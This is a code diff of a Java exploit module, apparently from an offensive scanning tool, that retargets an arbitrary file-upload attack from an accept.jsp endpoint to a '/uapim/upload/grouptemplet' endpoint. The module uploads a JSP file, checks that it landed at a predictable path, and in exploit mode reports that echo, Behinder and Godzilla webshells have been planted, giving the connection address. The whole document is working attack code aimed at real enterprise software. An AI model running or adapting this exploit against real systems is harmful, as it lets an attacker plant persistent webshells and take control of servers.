@@ -13,7 +13,6 @@ import org.apache.http.client.methods.HttpPost;
 import org.apache.http.entity.ContentType;
 import org.apache.http.entity.mime.MultipartEntityBuilder;
 import org.apache.http.entity.mime.content.FileBody;
-import org.apache.http.entity.mime.content.StringBody;
 import org.apache.http.impl.client.CloseableHttpClient;
 import org.apache.http.impl.client.HttpClients;
 
@@ -23,7 +22,7 @@ import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class Accept_Upload extends VulnBase {
+public class GroupTemplet_Upload extends VulnBase {
     public static boolean DNSLOG = false;
     public static boolean JNDI = false;
     public static boolean EXEC = false;
@@ -32,27 +31,27 @@ public class Accept_Upload extends VulnBase {
 
     private String pocFlag = "yyds";
     private String expFlag = ">@<";
+    private long timestamp = System.currentTimeMillis();
     private File file;
 
-    public Accept_Upload() {
-        super();
+    public GroupTemplet_Upload() {
     }
 
-    public Accept_Upload(TextArea log, TextArea execLog, TextArea uploadLog) {
-        super(log, execLog, uploadLog);
+    public GroupTemplet_Upload(TextArea log, TextArea uploadLog, TextArea execLog) {
+        super(log, uploadLog, execLog);
     }
 
     @Override
-    public void exploit() throws IOException {
+    public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
         try {
-            String vulnerable_url = Config.TARGET + "/aim/equipmap/accept.jsp";
+            String vulnerable_url = Config.TARGET + "/uapim/upload/grouptemplet?groupid=" + timestamp;
+
             HttpHost proxy = null;
 
             // 创建代理对象
             if (HttpProxy.IS_PROXY) {
                 proxy = new HttpHost(HttpProxy.PROXY_HOST, Integer.parseInt(HttpProxy.PROXY_PORT));
             }
-
 
             // 设置超时时间
             RequestConfig requestConfig = RequestConfig.custom()
@@ -62,7 +61,6 @@ public class Accept_Upload extends VulnBase {
                     .setConnectionRequestTimeout(Config.TIMEOUT) // 从连接池获取连接的超时时间，单位是毫秒
                     .build();
 
-
             // 创建HttpClient实例并应用超时设置
             CloseableHttpClient httpClient = HttpClients.custom()
                     .setDefaultRequestConfig(requestConfig)
@@ -71,7 +69,6 @@ public class Accept_Upload extends VulnBase {
             // 创建HttpPost实例
             HttpPost httpPost = new HttpPost(vulnerable_url);
 
-            String timestamp = System.currentTimeMillis() + "";
             String fileName = timestamp + ".jsp";
 
             // 信任ssl证书
@@ -96,9 +93,7 @@ public class Accept_Upload extends VulnBase {
 
             // 构建MultipartEntity
             HttpEntity entity = MultipartEntityBuilder.create()
-                    .setBoundary("---------------------------yFeOihSQU1QYLu0KwhX72U5C1sMYc")
-                    .addPart("upload", new FileBody(file, ContentType.TEXT_PLAIN, timestamp + ".txt"))
-                    .addPart("fname", new StringBody("\\webapps\\nc_web\\" + fileName, ContentType.TEXT_PLAIN))
+                    .addPart("file", new FileBody(file, ContentType.APPLICATION_OCTET_STREAM ,fileName))
                     .build();
 
             // 设置HttpPost的实体
@@ -106,19 +101,17 @@ public class Accept_Upload extends VulnBase {
 
             // 设置请求头
             httpPost.setHeader("User-Agent", "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36");
-            httpPost.setHeader("Connection", "close");
             httpPost.setHeader("Accept", "*/*");
-            httpPost.setHeader("Accept-Encoding", "gzip");
 
             // 执行请求并获取响应
             CloseableHttpResponse response = httpClient.execute(httpPost);
 
-            // 获取状态码 响应体
+            // 获取状态码
             int responseCode1 = response.getStatusLine().getStatusCode();
 
             if (responseCode1 == HttpURLConnection.HTTP_OK) {
                 // 检测上传文件是否存在
-                URL fileUrl = new URL(Config.TARGET + "/" + fileName);
+                URL fileUrl = new URL(Config.TARGET + "/uapim/static/pages/" + timestamp + "/head.jsp");
                 HttpURLConnection conn2 = (HttpURLConnection) fileUrl.openConnection();
 
                 // 设置超时
@@ -139,11 +132,12 @@ public class Accept_Upload extends VulnBase {
                     responseText2 = "";
                 }
 
+
                 if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(pocFlag) && Config.MOD.equals("poc")) {
-                    logMessage("[+] accept.jsp 文件上传漏洞存在, 成功上传测试文件: " + fileUrl);
+                    logMessage("[+] GroupTemplet 文件上传漏洞存在, 成功上传测试文件: " + fileUrl);
                     return;
                 } else if ((responseCode2 != HttpURLConnection.HTTP_OK || !responseText2.contains(pocFlag)) && Config.MOD.equals("poc")) {
-                    logMessage("[-] accept.jsp 文件上传漏洞不存在, 请尝试手动探测.");
+                    logMessage("[-] GroupTemplet 文件上传漏洞不存在, 请尝试手动探测.");
                     return;
                 } else if (responseCode2 == HttpURLConnection.HTTP_OK && responseText2.contains(expFlag) && Config.MOD.equals("exp")) {
                     logMessage("[+] 文件上传成功! 同时写入回显/冰蝎/哥斯拉, 连接地址: " + fileUrl + "\n[+] 请求头与连接密码见 README.md.");
@@ -160,23 +154,25 @@ public class Accept_Upload extends VulnBase {
                 }
             } else {
                 if (Config.MOD.equals("poc") || Config.MOD.equals("exp")) {
-                    logMessage("[-] accept.jsp 文件上传漏洞不存在.");
+                    logMessage("[-] GroupTemplet 文件上传漏洞不存在.");
                     return;
                 } else if (Config.MOD.equals("upload")) {
-                    logUpload("[-] accept.jsp 文件上传漏洞不存在.");
+                    logUpload("[-] GroupTemplet 文件上传漏洞不存在.");
                 }
             }
         } catch (Exception e) {
             if (Config.MOD.equals("poc") || Config.MOD.equals("exp")) {
-                logMessage("[-] accept.jsp 文件上传失败. " + e);
+                logMessage("[-] GroupTemplet 文件上传失败. " + e);
                 return;
             } else if (Config.MOD.equals("upload")) {
-                logUpload("[-] accept.jsp 文件上传失败. " + e);
+                logUpload("[-] GroupTemplet 文件上传失败. " + e);
                 return;
             }
         } finally {
-            // 删除临时文件
+            // 删除生成的临时文件
             file.delete();
         }
     }
+
+
 }
